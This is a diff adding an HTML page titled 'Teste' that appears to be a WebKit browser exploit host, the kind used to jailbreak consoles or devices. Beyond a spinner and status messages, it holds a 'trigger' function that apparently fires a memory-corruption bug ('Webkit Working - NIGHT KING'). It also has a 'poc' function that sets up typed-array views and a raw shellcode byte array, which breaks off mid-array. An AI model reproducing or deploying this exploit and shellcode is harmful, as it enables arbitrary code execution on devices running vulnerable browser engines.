@@ -1,0 +1,82 @@
+<html manifest="SALT.manifest" >
+<head>
+    <title>Teste</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background-color: #242629;
+        }
+
+        .loader {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            margin: -75px 0 0 -75px;
+
+            border: 10px solid #1f1e1e;
+            border-radius: 50%;
+            border-top: 10px solid #044595;
+            border-left: 10px solid #044595;
+            width: 120px;
+            height: 120px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .info {
+            overflow: hidden;
+            position: fixed;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+
+            font-size: 45px;
+            font-family: sans-serif;
+            color: #b8b8b8;
+
+            transform: translate(-50%, -50%);
+        }
+
+        .j {
+            font-size: 15px;
+            color: #2F3335;
+        }
+    </style>
+    <script>
+        function allset() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("allset").style.display = "block";
+        }
+
+        function awaitpl() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("awaiting").style.display = "block";
+        }
+    </script>
+    <script>
+        function trigger() {
+            document.getElementsByTagName("style")[0].appendChild(document.createElement("a")); 
+            setTimeout( () => {
+                msubEle.prepend("Webkit Working - NIGHT KING");
+                mathEle.focus()
+                mathEle.remove();
+            }, 0);
+        }
+    </script>
+    <script>
+        function poc() {
+            try {
+                var exp = new ArrayBuffer(0x400);
+                var u32 = new Uint32Array(exp);
+                var f64 = new Float64Array(exp);
+
+                var shellcode = [0x6a, 0x41, 0x58, 0x4c, 0x89, 0xd7, 0x68, 0x60, 0x7a, 0x44, 0x4c, 0x59, 0xf7, 0xe1, 0x50, 0x68, 0xb0, 0xc5, 0x54, 0x4f, 0x83, 0xec, 0x74, 0x89, 0xe1, 0x50, 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x4e, 0x31, 0xd2, 0x83, 0xc4, 0x74, 0x83, 0xec, 0x54, 0x89, 0xe1, 0x6a, 0x10, 0x51, 0x56, 0x50, 0xff, 0xd7, 0x83,
